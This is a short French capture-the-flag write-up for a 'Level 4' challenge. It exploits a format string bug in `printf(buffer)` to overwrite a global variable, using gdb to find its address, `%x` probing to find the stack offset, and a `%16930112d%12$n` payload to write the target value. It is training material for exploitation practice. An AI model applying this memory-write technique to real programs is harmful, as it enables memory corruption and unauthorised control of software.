### Level 4

#### Etape 01 :

Le principe est le meme que pour le niveau 3 : on exploite une faille de format string via `printf(buffer)`.

La difference ici est la condition : la variable globale `m` doit valoir `16930116`.
On ne peut donc pas simplement ecrire une petite valeur avec `%n`.

#### Etape 02 :

On recupere l'adresse de `m` avec `gdb` (ou `ghidra`) :

```bash
p &m
```

Adresse obtenue : `0x08049810`.

#### Etape 03 :

On cherche la position de notre buffer dans la stack en injectant des `%x` :

```bash
python -c 'print "eeee" + " %x" * 20' > /tmp/payload
cat /tmp/payload | ./level4
```

Sortie observee :

```text
eeee b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 65656565 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
```

`65656565` correspond a `eeee`, donc le debut de notre buffer est a la 12e position.

#### Etape 04 :

On construit le payload final :

- On place l'adresse de `m` au debut (`\x10\x98\x04\x08`).
- On imprime `16930112` caracteres avec `%16930112d`.
- Puis `%12$n` ecrit le nombre de caracteres imprimes dans `m`.

```bash
python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/payload
```

Execution :

```bash
cat /tmp/payload | ./level4
```

La condition est satisfaite et on recupere le flag.